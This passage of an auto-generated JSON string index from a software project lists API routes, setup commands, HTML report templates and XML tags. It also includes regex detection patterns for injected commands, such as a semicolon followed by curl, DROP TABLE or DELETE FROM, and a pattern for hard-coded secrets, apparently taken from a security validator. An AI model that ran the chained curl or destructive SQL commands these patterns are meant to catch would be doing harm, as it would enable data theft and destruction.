          "value": "/staging/backend:pr-",
          "category": "paths",
          "locations": []
        },
        "/staging/frontend:pr-": {
          "value": "/staging/frontend:pr-",
          "category": "paths",
          "locations": []
        },
        "/statistics": {
          "value": "/statistics",
          "category": "paths",
          "locations": []
        },
        "/stats": {
          "value": "/stats",
          "category": "paths",
          "locations": []
        },
        "/status": {
          "value": "/status",
          "category": "paths",
          "locations": []
        },
        "/status/{circuit_name}": {
          "value": "/status/{circuit_name}",
          "category": "paths",
          "locations": []
        },
        "/status/{job_id}": {
          "value": "/status/{job_id}",
          "category": "paths",
          "locations": []
        },
        "/stream": {
          "value": "/stream",
          "category": "paths",
          "locations": []
        },
        "/summary-stats": {
          "value": "/summary-stats",
          "category": "paths",
          "locations": []
        },
        "/supply-catalog/": {
          "value": "/supply-catalog/",
          "category": "paths",
          "locations": []
        },
        "/supply-catalog/{option_id}": {
          "value": "/supply-catalog/{option_id}",
          "category": "paths",
          "locations": []
        },
        "/support": {
          "value": "/support",
          "category": "paths",
          "locations": []
        },
        "/support/consultation": {
          "value": "/support/consultation",
          "category": "paths",
          "locations": []
        },
        "/synthetic": {
          "value": "/synthetic",
          "category": "paths",
          "locations": []
        },
        "/synthetic_data": {
          "value": "/synthetic_data",
          "category": "paths",
          "locations": []
        },
        "/sys/": {
          "value": "/sys/",
          "category": "paths",
          "locations": []
        },
        "/system": {
          "value": "/system",
          "category": "paths",
          "locations": []
        },
        "/system/comprehensive": {
          "value": "/system/comprehensive",
          "category": "paths",
          "locations": []
        },
        "/tables": {
          "value": "/tables",
          "category": "paths",
          "locations": []
        },
        "/templates": {
          "value": "/templates",
          "category": "paths",
          "locations": []
        },
        "/templates/analysis": {
          "value": "/templates/analysis",
          "category": "paths",
          "locations": []
        },
        "/templates/optimization": {
          "value": "/templates/optimization",
          "category": "paths",
          "locations": []
        },
        "/templates/reports": {
          "value": "/templates/reports",
          "category": "paths",
          "locations": []
        },
        "/test": {
          "value": "/test",
          "category": "paths",
          "locations": []
        },
        "/test-connection": {
          "value": "/test-connection",
          "category": "paths",
          "locations": []
        },
        "/test-simple": {
          "value": "/test-simple",
          "category": "paths",
          "locations": []
        },
        "/test/": {
          "value": "/test/",
          "category": "paths",
          "locations": []
        },
        "/tests/": {
          "value": "/tests/",
          "category": "paths",
          "locations": []
        },
        "/tests/**/*.py": {
          "value": "/tests/**/*.py",
          "category": "paths",
          "locations": []
        },
        "/thread/{thread_id}/runs": {
          "value": "/thread/{thread_id}/runs",
          "category": "paths",
          "locations": []
        },
        "/tmp/act-artifacts/": {
          "value": "/tmp/act-artifacts/",
          "category": "paths",
          "locations": []
        },
        "/toggle": {
          "value": "/toggle",
          "category": "paths",
          "locations": []
        },
        "/token": {
          "value": "/token",
          "category": "paths",
          "locations": []
        },
        "/tools": {
          "value": "/tools",
          "category": "paths",
          "locations": []
        },
        "/tools/call": {
          "value": "/tools/call",
          "category": "paths",
          "locations": []
        },
        "/tools/data-validator": {
          "value": "/tools/data-validator",
          "category": "paths",
          "locations": []
        },
        "/tools/diagnostics": {
          "value": "/tools/diagnostics",
          "category": "paths",
          "locations": []
        },
        "/tools/execute": {
          "value": "/tools/execute",
          "category": "paths",
          "locations": []
        },
        "/tools/planning-wizard": {
          "value": "/tools/planning-wizard",
          "category": "paths",
          "locations": []
        },
        "/tools/report-builder": {
          "value": "/tools/report-builder",
          "category": "paths",
          "locations": []
        },
        "/tools/sample-analysis": {
          "value": "/tools/sample-analysis",
          "category": "paths",
          "locations": []
        },
        "/transactions/active": {
          "value": "/transactions/active",
          "category": "paths",
          "locations": []
        },
        "/transactions/stats": {
          "value": "/transactions/stats",
          "category": "paths",
          "locations": []
        },
        "/trends": {
          "value": "/trends",
          "category": "paths",
          "locations": []
        },
        "/ttl": {
          "value": "/ttl",
          "category": "paths",
          "locations": []
        },
        "/types/Message": {
          "value": "/types/Message",
          "category": "paths",
          "locations": []
        },
        "/types/agent": {
          "value": "/types/agent",
          "category": "paths",
          "locations": []
        },
        "/types/chat": {
          "value": "/types/chat",
          "category": "paths",
          "locations": []
        },
        "/upload": {
          "value": "/upload",
          "category": "paths",
          "locations": []
        },
        "/user/plan": {
          "value": "/user/plan",
          "category": "paths",
          "locations": []
        },
        "/users": {
          "value": "/users",
          "category": "paths",
          "locations": []
        },
        "/v1/": {
          "value": "/v1/",
          "category": "paths",
          "locations": []
        },
        "/v2/": {
          "value": "/v2/",
          "category": "paths",
          "locations": []
        },
        "/validate": {
          "value": "/validate",
          "category": "paths",
          "locations": []
        },
        "/venv/": {
          "value": "/venv/",
          "category": "paths",
          "locations": []
        },
        "/verify": {
          "value": "/verify",
          "category": "paths",
          "locations": []
        },
        "/version": {
          "value": "/version",
          "category": "paths",
          "locations": []
        },
        "/version/": {
          "value": "/version/",
          "category": "paths",
          "locations": []
        },
        "/versions/": {
          "value": "/versions/",
          "category": "paths",
          "locations": []
        },
        "/versions/latest": {
          "value": "/versions/latest",
          "category": "paths",
          "locations": []
        },
        "/violations": {
          "value": "/violations",
          "category": "paths",
          "locations": []
        },
        "/websocket": {
          "value": "/websocket",
          "category": "paths",
          "locations": []
        },
        "/websocket/auth": {
          "value": "/websocket/auth",
          "category": "paths",
          "locations": []
        },
        "/websocket/validate": {
          "value": "/websocket/validate",
          "category": "paths",
          "locations": []
        },
        "/windows/system32": {
          "value": "/windows/system32",
          "category": "paths",
          "locations": []
        },
        "/ws": {
          "value": "/ws",
          "category": "paths",
          "locations": []
        },
        "/ws/config": {
          "value": "/ws/config",
          "category": "paths",
          "locations": []
        },
        "/ws/health": {
          "value": "/ws/health",
          "category": "paths",
          "locations": []
        },
        "/ws/stats": {
          "value": "/ws/stats",
          "category": "paths",
          "locations": []
        },
        "/ws/{user_id}": {
          "value": "/ws/{user_id}",
          "category": "paths",
          "locations": []
        },
        "/{corpus_id}": {
          "value": "/{corpus_id}",
          "category": "paths",
          "locations": []
        },
        "/{corpus_id}/clone": {
          "value": "/{corpus_id}/clone",
          "category": "paths",
          "locations": []
        },
        "/{corpus_id}/content": {
          "value": "/{corpus_id}/content",
          "category": "paths",
          "locations": []
        },
        "/{corpus_id}/generate": {
          "value": "/{corpus_id}/generate",
          "category": "paths",
          "locations": []
        },
        "/{corpus_id}/statistics": {
          "value": "/{corpus_id}/statistics",
          "category": "paths",
          "locations": []
        },
        "/{corpus_id}/status": {
          "value": "/{corpus_id}/status",
          "category": "paths",
          "locations": []
        },
        "/{corpus_id}/upload": {
          "value": "/{corpus_id}/upload",
          "category": "paths",
          "locations": []
        },
        "/{run_id}/state": {
          "value": "/{run_id}/state",
          "category": "paths",
          "locations": []
        },
        "/{run_id}/status": {
          "value": "/{run_id}/status",
          "category": "paths",
          "locations": []
        },
        "/{thread_id}": {
          "value": "/{thread_id}",
          "category": "paths",
          "locations": []
        },
        "/{thread_id}/auto-rename": {
          "value": "/{thread_id}/auto-rename",
          "category": "paths",
          "locations": []
        },
        "/{thread_id}/messages": {
          "value": "/{thread_id}/messages",
          "category": "paths",
          "locations": []
        },
        "1. Apply terraform changes: cd terraform/staging/shared-infrastructure && terraform apply": {
          "value": "1. Apply terraform changes: cd terraform/staging/shared-infrastructure && terraform apply",
          "category": "paths",
          "locations": []
        },
        "1. Run: ./start_dev.sh": {
          "value": "1. Run: ./start_dev.sh",
          "category": "paths",
          "locations": []
        },
        "1. Run: python scripts/auth_constants_migration.py --migrate --dry-run": {
          "value": "1. Run: python scripts/auth_constants_migration.py --migrate --dry-run",
          "category": "paths",
          "locations": []
        },
        "1. Run: python scripts/dev_launcher.py": {
          "value": "1. Run: python scripts/dev_launcher.py",
          "category": "paths",
          "locations": []
        },
        "1. Run: python scripts/fix_all_import_issues.py --absolute-only": {
          "value": "1. Run: python scripts/fix_all_import_issues.py --absolute-only",
          "category": "paths",
          "locations": []
        },
        "1. Try logging in at: https://app.staging.netrasystems.ai": {
          "value": "1. Try logging in at: https://app.staging.netrasystems.ai",
          "category": "paths",
          "locations": []
        },
        "2. Access frontend at: http://localhost:3000": {
          "value": "2. Access frontend at: http://localhost:3000",
          "category": "paths",
          "locations": []
        },
        "2. Open: http://localhost:3000": {
          "value": "2. Open: http://localhost:3000",
          "category": "paths",
          "locations": []
        },
        "2. Test with: python scripts/metadata_validator.py --validate-all": {
          "value": "2. Test with: python scripts/metadata_validator.py --validate-all",
          "category": "paths",
          "locations": []
        },
        "2. Update SPEC/learnings/import_management.xml with new patterns": {
          "value": "2. Update SPEC/learnings/import_management.xml with new patterns",
          "category": "paths",
          "locations": []
        },
        "2. View: app/tests/examples/test_tdd_workflow_demo.py": {
          "value": "2. View: app/tests/examples/test_tdd_workflow_demo.py",
          "category": "paths",
          "locations": []
        },
        "3. CI/CD maintains 100% pass rate (xfail doesn't break build)": {
          "value": "3. CI/CD maintains 100% pass rate (xfail doesn't break build)",
          "category": "paths",
          "locations": []
        },
        "3. Run: python scripts/auth_constants_migration.py --migrate": {
          "value": "3. Run: python scripts/auth_constants_migration.py --migrate",
          "category": "paths",
          "locations": []
        },
        "4. Explore: test_framework/decorators.py for all options": {
          "value": "4. Explore: test_framework/decorators.py for all options",
          "category": "paths",
          "locations": []
        },
        "4. Re-run validation: python scripts/validate_type_deduplication.py": {
          "value": "4. Re-run validation: python scripts/validate_type_deduplication.py",
          "category": "paths",
          "locations": []
        },
        "4. Run 'python scripts/metadata_validator.py --validate-all' to check existing files": {
          "value": "4. Run 'python scripts/metadata_validator.py --validate-all' to check existing files",
          "category": "paths",
          "locations": []
        },
        "://\\1:***@": {
          "value": "://\\1:***@",
          "category": "paths",
          "locations": []
        },
        ":/sandbox/script.py:ro": {
          "value": ":/sandbox/script.py:ro",
          "category": "paths",
          "locations": []
        },
        ":\\d{1,5}$": {
          "value": ":\\d{1,5}$",
          "category": "paths",
          "locations": []
        },
        ":\\d{2,5}(?:/|\\b)": {
          "value": ":\\d{2,5}(?:/|\\b)",
          "category": "paths",
          "locations": []
        },
        ":\\s*ConnectionManager\\b": {
          "value": ":\\s*ConnectionManager\\b",
          "category": "paths",
          "locations": []
        },
        ":\\w+": {
          "value": ":\\w+",
          "category": "paths",
          "locations": []
        },
        "; }\n                .total { font-weight: bold; }\n                table { width: 100%; border-collapse: collapse; }\n                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }\n            </style>\n        </head>\n        <body>\n            <div class=\"header\">\n                <h1>INVOICE</h1>\n                <h2>": {
          "value": "; }\n                .total { font-weight: bold; }\n                table { width: 100%; border-collapse: collapse; }\n                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }\n            </style>\n        </head>\n        <body>\n            <div class=\"header\">\n                <h1>INVOICE</h1>\n                <h2>",
          "category": "paths",
          "locations": []
        },
        ";\\s*$": {
          "value": ";\\s*$",
          "category": "paths",
          "locations": []
        },
        ";\\s*DELETE": {
          "value": ";\\s*DELETE",
          "category": "paths",
          "locations": []
        },
        ";\\s*DELETE\\s+FROM": {
          "value": ";\\s*DELETE\\s+FROM",
          "category": "paths",
          "locations": []
        },
        ";\\s*DROP\\s+TABLE": {
          "value": ";\\s*DROP\\s+TABLE",
          "category": "paths",
          "locations": []
        },
        ";\\s*INSERT\\s+INTO": {
          "value": ";\\s*INSERT\\s+INTO",
          "category": "paths",
          "locations": []
        },
        ";\\s*curl\\s+": {
          "value": ";\\s*curl\\s+",
          "category": "paths",
          "locations": []
        },
        "<!DOCTYPE html>\n        <html>\n        <head>\n            <title>Cross-Service Validation Report</title>\n            <style>\n                body { font-family: Arial, sans-serif; margin: 40px; }\n                .header { background-color: #f5f5f5; padding: 20px; border-radius: 5px; }\n                .status { color:": {
          "value": "<!DOCTYPE html>\n        <html>\n        <head>\n            <title>Cross-Service Validation Report</title>\n            <style>\n                body { font-family: Arial, sans-serif; margin: 40px; }\n                .header { background-color: #f5f5f5; padding: 20px; border-radius: 5px; }\n                .status { color:",
          "category": "paths",
          "locations": []
        },
        "<!DOCTYPE html>\n<html><head><title>Agent Test Validation Report</title></head>\n<body>\n<h1>Agent Test Validation Report</h1>\n<p>Generated:": {
          "value": "<!DOCTYPE html>\n<html><head><title>Agent Test Validation Report</title></head>\n<body>\n<h1>Agent Test Validation Report</h1>\n<p>Generated:",
          "category": "paths",
          "locations": []
        },
        "<!\\[CDATA\\[": {
          "value": "<!\\[CDATA\\[",
          "category": "paths",
          "locations": []
        },
        "</body>\n</html>": {
          "value": "</body>\n</html>",
          "category": "paths",
          "locations": []
        },
        "</categories>": {
          "value": "</categories>",
          "category": "paths",
          "locations": []
        },
        "</category>": {
          "value": "</category>",
          "category": "paths",
          "locations": []
        },
        "</description>": {
          "value": "</description>",
          "category": "paths",
          "locations": []
        },
        "</details>": {
          "value": "</details>",
          "category": "paths",
          "locations": []
        },
        "</div>": {
          "value": "</div>",
          "category": "paths",
          "locations": []
        },
        "</div>\n                    <div class=\"metric-label\">Files Scanned</div>\n                </div>": {
          "value": "</div>\n                    <div class=\"metric-label\">Files Scanned</div>\n                </div>",
          "category": "paths",
          "locations": []
        },
        "</div>\n                    <div class=\"metric-label\">Functions Scanned</div>\n                </div>": {
          "value": "</div>\n                    <div class=\"metric-label\">Functions Scanned</div>\n                </div>",
          "category": "paths",
          "locations": []
        },
        "</div>\n                    <div class=\"metric-label\">Total Violations</div>\n                </div>": {
          "value": "</div>\n                    <div class=\"metric-label\">Total Violations</div>\n                </div>",
          "category": "paths",
          "locations": []
        },
        "</div>\n                    <div>Failed</div>\n                </div>\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold;\">": {
          "value": "</div>\n                    <div>Failed</div>\n                </div>\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold;\">",
          "category": "paths",
          "locations": []
        },
        "</div>\n                    <div>Passed</div>\n                </div>\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold; color: orange;\">": {
          "value": "</div>\n                    <div>Passed</div>\n                </div>\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold; color: orange;\">",
          "category": "paths",
          "locations": []
        },
        "</div>\n                    <div>Total Checks</div>\n                </div>\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold; color: green;\">": {
          "value": "</div>\n                    <div>Total Checks</div>\n                </div>\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold; color: green;\">",
          "category": "paths",
          "locations": []
        },
        "</div>\n                    <div>Warnings</div>\n                </div>\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold; color: red;\">": {
          "value": "</div>\n                    <div>Warnings</div>\n                </div>\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold; color: red;\">",
          "category": "paths",
          "locations": []
        },
        "</div>\n                <div id=\"duplicates\" class=\"tab-content\">": {
          "value": "</div>\n                <div id=\"duplicates\" class=\"tab-content\">",
          "category": "paths",
          "locations": []
        },
        "</div>\n                <div id=\"function-complexity\" class=\"tab-content\">": {
          "value": "</div>\n                <div id=\"function-complexity\" class=\"tab-content\">",
          "category": "paths",
          "locations": []
        },
        "</div>\n                <div id=\"worst-offenders\" class=\"tab-content\">": {
          "value": "</div>\n                <div id=\"worst-offenders\" class=\"tab-content\">",
          "category": "paths",
          "locations": []
        },
        "</div>\n        </body>\n        </html>": {
          "value": "</div>\n        </body>\n        </html>",
          "category": "paths",
          "locations": []
        },
        "</div>\n        <div class=\"footer\">\n            <p>Generated by Netra Architecture Health Monitor | \n            <a href=\"https://github.com/netra-ai/netra-core\" target=\"_blank\">View on GitHub</a></p>\n        </div>\n    </div>": {
          "value": "</div>\n        <div class=\"footer\">\n            <p>Generated by Netra Architecture Health Monitor | \n            <a href=\"https://github.com/netra-ai/netra-core\" target=\"_blank\">View on GitHub</a></p>\n        </div>\n    </div>",
          "category": "paths",
          "locations": []
        },
        "</file>": {
          "value": "</file>",
          "category": "paths",
          "locations": []
        },
        "</h2>\n                <p>": {
          "value": "</h2>\n                <p>",
          "category": "paths",
          "locations": []
        },
        "</h3>\n                    <p><strong>Status:</strong>": {
          "value": "</h3>\n                    <p><strong>Status:</strong>",
          "category": "paths",
          "locations": []
        },
        "</head>\n<body>\n    <div class=\"dashboard\">": {
          "value": "</head>\n<body>\n    <div class=\"dashboard\">",
          "category": "paths",
          "locations": []
        },
        "</id>": {
          "value": "</id>",
          "category": "paths",
          "locations": []
        },
        "</learning>": {
          "value": "</learning>",
          "category": "paths",
          "locations": []
        },
        "</learning_count>": {
          "value": "</learning_count>",
          "category": "paths",
          "locations": []
        },
        "</learning_ids>": {
          "value": "</learning_ids>",
          "category": "paths",
          "locations": []
        },
        "</learnings>": {
          "value": "</learnings>",
          "category": "paths",
          "locations": []
        },
        "</li>": {
          "value": "</li>",
          "category": "paths",
          "locations": []
        },
        "</metadata>": {
          "value": "</metadata>",
          "category": "paths",
          "locations": []
        },
        "</name>": {
          "value": "</name>",
          "category": "paths",
          "locations": []
        },
        "</p>": {
          "value": "</p>",
          "category": "paths",
          "locations": []
        },
        "</p>\n                    <p><strong>Message:</strong>": {
          "value": "</p>\n                    <p><strong>Message:</strong>",
          "category": "paths",
          "locations": []
        },
        "</p>\n                    <p><strong>Severity:</strong>": {
          "value": "</p>\n                    <p><strong>Severity:</strong>",
          "category": "paths",
          "locations": []
        },
        "</p>\n                <p class=\"total\">Total: $": {
          "value": "</p>\n                <p class=\"total\">Total: $",
          "category": "paths",
          "locations": []
        },
        "</p>\n                <p><strong>Customer ID:</strong>": {
          "value": "</p>\n                <p><strong>Customer ID:</strong>",
          "category": "paths",
          "locations": []
        },
        "</p>\n                <p><strong>Date:</strong>": {
          "value": "</p>\n                <p><strong>Date:</strong>",
          "category": "paths",
          "locations": []
        },
        "</p>\n                <p><strong>Due Date:</strong>": {
          "value": "</p>\n                <p><strong>Due Date:</strong>",
          "category": "paths",
          "locations": []
        },
        "</p>\n                <p><strong>Generated:</strong>": {
          "value": "</p>\n                <p><strong>Generated:</strong>",
          "category": "paths",
          "locations": []
        },
        "</p>\n                <p><strong>Status:</strong> <span class=\"status\">": {
          "value": "</p>\n                <p><strong>Status:</strong> <span class=\"status\">",
          "category": "paths",
          "locations": []
        },
        "</p>\n                <p>Support:": {
          "value": "</p>\n                <p>Support:",
          "category": "paths",
          "locations": []
        },
        "</p>\n                <p>Tax: $": {
          "value": "</p>\n                <p>Tax: $",
          "category": "paths",
          "locations": []
        },
        "</p>\n            </div>\n            \n            <div class=\"footer\">\n                <p>": {
          "value": "</p>\n            </div>\n            \n            <div class=\"footer\">\n                <p>",
          "category": "paths",
          "locations": []
        },
        "</p>\n            </div>\n            \n            <div class=\"invoice-details\">\n                <p><strong>Invoice Number:</strong>": {
          "value": "</p>\n            </div>\n            \n            <div class=\"invoice-details\">\n                <p><strong>Invoice Number:</strong>",
          "category": "paths",
          "locations": []
        },
        "</p>\n            </div>\n            \n            <div class=\"summary\">\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold;\">": {
          "value": "</p>\n            </div>\n            \n            <div class=\"summary\">\n                <div class=\"metric\">\n                    <div style=\"font-size: 24px; font-weight: bold;\">",
          "category": "paths",
          "locations": []
        },
        "</p>\n            </div>\n            \n            <table>\n                <thead>\n                    <tr><th>Description</th><th>Quantity</th><th>Unit Price</th><th>Total</th></tr>\n                </thead>\n                <tbody>": {
          "value": "</p>\n            </div>\n            \n            <table>\n                <thead>\n                    <tr><th>Description</th><th>Quantity</th><th>Unit Price</th><th>Total</th></tr>\n                </thead>\n                <tbody>",
          "category": "paths",
          "locations": []
        },
        "</p>\n            </div>\n        </body>\n        </html>": {
          "value": "</p>\n            </div>\n        </body>\n        </html>",
          "category": "paths",
          "locations": []
        },
        "</p>\n        </div>": {
          "value": "</p>\n        </div>",
          "category": "paths",
          "locations": []
        },
        "</p>\n<h2>Summary</h2>\n<p>Status:": {
          "value": "</p>\n<h2>Summary</h2>\n<p>Status:",
          "category": "paths",
          "locations": []
        },
        "</p>\n<p>Coverage:": {
          "value": "</p>\n<p>Coverage:",
          "category": "paths",
          "locations": []
        },
        "</path>": {
          "value": "</path>",
          "category": "paths",
          "locations": []
        },
        "</script>": {
          "value": "</script>",
          "category": "paths",
          "locations": []
        },
        "</span>\n**Growth Risk:**": {
          "value": "</span>\n**Growth Risk:**",
          "category": "paths",
          "locations": []
        },
        "</span></p>\n                <p><strong>Services:</strong>": {
          "value": "</span></p>\n                <p><strong>Services:</strong>",
          "category": "paths",
          "locations": []
        },
        "</specification>": {
          "value": "</specification>",
          "category": "paths",
          "locations": []
        },
        "</statistics>": {
          "value": "</statistics>",
          "category": "paths",
          "locations": []
        },
        "</style>": {
          "value": "</style>",
          "category": "paths",
          "locations": []
        },
        "</tbody>\n            </table>\n            \n            <div class=\"totals\">\n                <p>Subtotal: $": {
          "value": "</tbody>\n            </table>\n            \n            <div class=\"totals\">\n                <p>Subtotal: $",
          "category": "paths",
          "locations": []
        },
        "</tbody>\n        </table>": {
          "value": "</tbody>\n        </table>",
          "category": "paths",
          "locations": []
        },
        "</td>\n                        <td>": {
          "value": "</td>\n                        <td>",
          "category": "paths",
          "locations": []
        },
        "</td>\n                        <td>$": {
          "value": "</td>\n                        <td>$",
          "category": "paths",
          "locations": []
        },
        "</td>\n                    </tr>": {
          "value": "</td>\n                    </tr>",
          "category": "paths",
          "locations": []
        },
        "</td>\n                <td class=\"": {
          "value": "</td>\n                <td class=\"",
          "category": "paths",
          "locations": []
        },
        "</td>\n                <td>": {
          "value": "</td>\n                <td>",
          "category": "paths",
          "locations": []
        },
        "</td>\n                <td>File Size</td>\n                <td>": {
          "value": "</td>\n                <td>File Size</td>\n                <td>",
          "category": "paths",
          "locations": []
        },
        "</td>\n            </tr>": {
          "value": "</td>\n            </tr>",
          "category": "paths",
          "locations": []
        },
        "</th>": {
          "value": "</th>",
          "category": "paths",
          "locations": []
        },
        "</title>\n            <style>\n                body { font-family:": {
          "value": "</title>\n            <style>\n                body { font-family:",
          "category": "paths",
          "locations": []
        },
        "</total_categories>": {
          "value": "</total_categories>",
          "category": "paths",
          "locations": []
        },
        "</total_learnings>": {
          "value": "</total_learnings>",
          "category": "paths",
          "locations": []
        },
        "</tr></thead>\n            <tbody>": {
          "value": "</tr></thead>\n            <tbody>",
          "category": "paths",
          "locations": []
        },
        "</ul>\n            </div>": {
          "value": "</ul>\n            </div>",
          "category": "paths",
          "locations": []
        },
        "</ul>\n</body></html>": {
          "value": "</ul>\n</body></html>",
          "category": "paths",
          "locations": []
        },
        "</ul>\n<h2>Recommendations</h2>\n<ul>": {
          "value": "</ul>\n<h2>Recommendations</h2>\n<ul>",
          "category": "paths",
          "locations": []
        },
        "</usage>": {
          "value": "</usage>",
          "category": "paths",
          "locations": []
        },
        "<TestProviders>{children}</TestProviders>": {
          "value": "<TestProviders>{children}</TestProviders>",
          "category": "paths",
          "locations": []
        },
        "<WebSocketProvider>\\{children\\}</WebSocketProvider>": {
          "value": "<WebSocketProvider>\\{children\\}</WebSocketProvider>",
          "category": "paths",
          "locations": []
        },
        "<category>([^<]+)</category>": {
          "value": "<category>([^<]+)</category>",
          "category": "paths",
          "locations": []
        },
        "<description>Index of all learning modules organized by category</description>": {
          "value": "<description>Index of all learning modules organized by category</description>",
          "category": "paths",
          "locations": []
        },
        "<div class=\"header\">\n            <h1>🏗️ Architecture Health Dashboard</h1>\n            <p>Comprehensive monitoring of architectural compliance and code quality</p>\n            <p>Last updated:": {
          "value": "<div class=\"header\">\n            <h1>🏗️ Architecture Health Dashboard</h1>\n            <p>Comprehensive monitoring of architectural compliance and code quality</p>\n            <p>Last updated:",
          "category": "paths",
          "locations": []
        },
        "<div class=\"recommendations\">\n                <h3>🎯 Recommended Actions</h3>\n                <ul>": {
          "value": "<div class=\"recommendations\">\n                <h3>🎯 Recommended Actions</h3>\n                <ul>",
          "category": "paths",
          "locations": []
        },
        "<div class=\"tabs\">\n                    <div class=\"tab active\" onclick=\"showTab('file-size')\">File Size Violations</div>\n                    <div class=\"tab\" onclick=\"showTab('function-complexity')\">Function Complexity</div>\n                    <div class=\"tab\" onclick=\"showTab('duplicates')\">Duplicate Types</div>\n                    <div class=\"tab\" onclick=\"showTab('worst-offenders')\">Worst Offenders</div>\n                </div>": {
          "value": "<div class=\"tabs\">\n                    <div class=\"tab active\" onclick=\"showTab('file-size')\">File Size Violations</div>\n                    <div class=\"tab\" onclick=\"showTab('function-complexity')\">Function Complexity</div>\n                    <div class=\"tab\" onclick=\"showTab('duplicates')\">Duplicate Types</div>\n                    <div class=\"tab\" onclick=\"showTab('worst-offenders')\">Worst Offenders</div>\n                </div>",
          "category": "paths",
          "locations": []
        },
        "<file>learnings/": {
          "value": "<file>learnings/",
          "category": "paths",
          "locations": []
        },
        "<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <level>{level: <8}</level> | <cyan>{name}</cyan>:<cyan>{function}</cyan>:<cyan>{line}</cyan> | <level>{message}</level>": {
          "value": "<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <level>{level: <8}</level> | <cyan>{name}</cyan>:<cyan>{function}</cyan>:<cyan>{line}</cyan> | <level>{message}</level>",
          "category": "paths",
          "locations": []
        },
        "<html>\n        <head><title>AI Operations Report</title></head>\n        <body>\n            <h1>AI Operations Analysis</h1>\n            <p>Repository: {repo_url}</p>\n            <h2>Metrics</h2>\n            <ul>{metrics_html}</ul>\n        </body>\n        </html>": {
          "value": "<html>\n        <head><title>AI Operations Report</title></head>\n        <body>\n            <h1>AI Operations Analysis</h1>\n            <p>Repository: {repo_url}</p>\n            <h2>Metrics</h2>\n            <ul>{metrics_html}</ul>\n        </body>\n        </html>",
          "category": "paths",
          "locations": []
        },
        "<instruction>Check index.xml for complete category listing and learning IDs</instruction>": {
          "value": "<instruction>Check index.xml for complete category listing and learning IDs</instruction>",
          "category": "paths",
          "locations": []
        },
        "<instruction>Each category file contains related learnings and troubleshooting patterns</instruction>": {
          "value": "<instruction>Each category file contains related learnings and troubleshooting patterns</instruction>",
          "category": "paths",
          "locations": []
        },
        "<instruction>Search specific category files for targeted fixes and solutions</instruction>": {
          "value": "<instruction>Search specific category files for targeted fixes and solutions</instruction>",
          "category": "paths",
          "locations": []
        },
        "<instruction>Use learning IDs to quickly find specific fixes across categories</instruction>": {
          "value": "<instruction>Use learning IDs to quickly find specific fixes across categories</instruction>",
          "category": "paths",
          "locations": []
        },
        "<last_updated>2025-08-16</last_updated>": {
          "value": "<last_updated>2025-08-16</last_updated>",
          "category": "paths",
          "locations": []
        },
        "<learning id=\"([^\"]+)\">(.*?)</learning>": {
          "value": "<learning id=\"([^\"]+)\">(.*?)</learning>",
          "category": "paths",
          "locations": []
        },
        "<meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Architecture Health Dashboard - Netra</title>\n    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>": {
          "value": "<meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Architecture Health Dashboard - Netra</title>\n    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>",
          "category": "paths",
          "locations": []
        },
        "<name>Learnings Index</name>": {
          "value": "<name>Learnings Index</name>",
          "category": "paths",
          "locations": []
        },
        "<p><strong>Execution Time:</strong>": {
          "value": "<p><strong>Execution Time:</strong>",
          "category": "paths",
          "locations": []
        },
        "<p><strong>Service Pair:</strong>": {
          "value": "<p><strong>Service Pair:</strong>",
          "category": "paths",
          "locations": []
        },
        "<p>🎉 No duplicate type definitions found!</p>": {
          "value": "<p>🎉 No duplicate type definitions found!</p>",
          "category": "paths",
          "locations": []
        },
        "<p>🎉 No file size violations found! All files are under 300 lines.</p>": {
          "value": "<p>🎉 No file size violations found! All files are under 300 lines.</p>",
          "category": "paths",
          "locations": []
        },
        "<p>🎉 No function complexity violations found! All functions are under 8 lines.</p>": {
          "value": "<p>🎉 No function complexity violations found! All functions are under 8 lines.</p>",
          "category": "paths",
          "locations": []
        },
        "<p>🎉 No major offenders found!</p>": {
          "value": "<p>🎉 No major offenders found!</p>",
          "category": "paths",
          "locations": []
        },
        "<path>SPEC/learnings/": {
          "value": "<path>SPEC/learnings/",
          "category": "paths",
          "locations": []
        },
        "<script[^>]*>.*?</script>": {
          "value": "<script[^>]*>.*?</script>",
          "category": "paths",
          "locations": []
        },
        "<style[^>]*>.*?</style>": {
          "value": "<style[^>]*>.*?</style>",
          "category": "paths",
          "locations": []
        },
        "<summary>File Coverage</summary>": {
          "value": "<summary>File Coverage</summary>",
          "category": "paths",
          "locations": []
        },
        "<summary>Stack Trace</summary>": {
          "value": "<summary>Stack Trace</summary>",
          "category": "paths",
          "locations": []
        },
        "<type>index</type>": {
          "value": "<type>index</type>",
          "category": "paths",
          "locations": []
        },
        "<type>learnings</type>": {
          "value": "<type>learnings</type>",
          "category": "paths",
          "locations": []
        },
        "<version>1.0</version>": {
          "value": "<version>1.0</version>",
          "category": "paths",
          "locations": []
        },
        "=\\s*ConnectionManager\\b": {
          "value": "=\\s*ConnectionManager\\b",
          "category": "paths",
          "locations": []
        },
        "=\\s*[\"'][A-Za-z0-9]{20,}[\"']": {
          "value": "=\\s*[\"'][A-Za-z0-9]{20,}[\"']",
          "category": "paths",
          "locations": []
        },
        "=\\s*[\"'][^\"']+[\"']": {
          "value": "=\\s*[\"'][^\"']+[\"']",
          "category": "paths",
          "locations": []
        },
        ">\\s*/dev/": {
          "value": ">\\s*/dev/",
          "category": "paths",
          "locations": []
        },
        "? (y/N):": {
          "value": "? (y/N):",
          "category": "paths",
          "locations": []
        },
        "? (y/n):": {
          "value": "? (y/n):",
          "category": "paths",
          "locations": []
        },
        "? (yes/no):": {
